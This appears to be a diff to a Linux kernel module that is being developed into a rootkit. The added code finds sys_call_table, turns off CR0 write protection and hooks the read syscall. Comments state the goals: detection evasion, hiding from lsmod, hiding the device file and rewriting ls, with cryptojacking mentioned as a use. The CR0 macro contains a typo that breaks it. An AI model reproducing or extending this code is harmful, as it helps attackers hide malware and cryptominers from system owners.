@@ -8,6 +8,7 @@
 #include <linux/uaccess.h>
 #include <asm/errno.h>
 #include <linux/kallsyms.h>
+#include <linux/syscalls.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("LS");
@@ -34,6 +35,21 @@ static char command_buffer[10];
 static char *command_ptr;
 static int Device_Open = 0;
 static int USE_COUNT = 0;
+
+static typeof(sys_read) *orig_read;
+//Test fakeread
+static asmlinkage long fakeRead(int fd, char __user *buf, size_t count) {
+	printk("we have succesfully intecepted a read!\n");
+	return orig_read(fd, buf, count);
+}
+
+//Lemme write to syscall table real quick
+#define CRO_WRITE_UNLOCK(x) \
+	do {i \
+		write_cr0(read_cr0() & (~X86_CR0_WP)); \
+		x; \
+		write_cr0(read_cr0() | X86_CR0_WP); \
+	} while(0)
 
 static struct file_operations file_ops
 = {
@@ -194,9 +210,29 @@ static ssize_t device_write(struct file *filp,
 				write_func(cr4_val);
 				break;
 			}
-		case 3: //Fake process info and usage 
-			printk("Recieved the command to fake process usage and information... Probably useful for cryptojacking and hiding.\n");
+		case 3: //Fake process info and usage via syscall hooking 
+			{
+			unsigned long *syscall_table; 
+			printk("Hooking into sys_calls for general detection evasion\n");
+
+			/*
+			 1. re-write ls binary
+			 2. do not showup in lsmod
+			 3. hide dev file
+			 */
+			
+			//Syscall modification test
+			syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
+			if(syscall_table == 0) {
+				printk("Could not find address of sys_call_table\n");
+				return write_bytes;
+			}
+
+			//save old read
+			orig_read = (typeof(sys_read) *)syscall_table[__NR_read];
+			syscall_table[__NR_read] = (void *)fakeRead;
 			break;
+			}
 		case 4: //Fake CPU usage and programs running 
 			printk("Recieved the command to execute action 4...\n");
 			break;
